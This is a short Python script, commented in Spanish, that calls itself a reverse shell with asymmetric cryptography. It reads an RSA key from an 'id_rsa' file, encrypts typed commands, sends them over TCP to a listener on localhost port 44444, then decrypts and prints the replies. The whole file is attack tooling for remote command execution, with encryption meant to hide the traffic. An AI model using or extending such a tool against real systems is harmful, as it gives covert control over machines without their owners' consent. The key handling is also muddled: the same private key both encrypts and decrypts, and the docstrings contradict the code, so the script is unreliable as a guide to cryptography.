#! /usr/bin/python3
# coding=utf-8

"""
Reverse shell + criptografia asimetrica
"""

import socket

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

HOST = "127.0.0.1"
PORT = 44444
llave_priv = open("id_rsa", "r").read()

def cifrado(comando, llave_privada):
    '''
    Cifrar el comando
    param: salida_comando String to be encrypted
    param: llave_publica public key
    return base64 encoded encrypted string
    '''

    rsakey = RSA.importKey(llave_privada)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = rsakey.encrypt(comando)
    return encrypted

def descifrado(salida_comando_cifrado_pub, llave_privada):
    """
    Decifrar el comando
    param: command_cifrado_priv String to be decrypted
    param: llave_privada public key
    return decrypted string
    """

    rsakey = RSA.importKey(llave_privada)
    rsakey = PKCS1_OAEP.new(rsakey)
    decrypted = rsakey.decrypt(salida_comando_cifrado_pub)
    return decrypted

while True:
    data = cifrado(input(">>: ").encode("utf-8"), llave_priv)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
        new_socket.connect((HOST, PORT))
        new_socket.sendall(data)
        data = new_socket.recv(1024)
        data = descifrado(data,llave_priv)
        print(f"Received data: \n{data}")
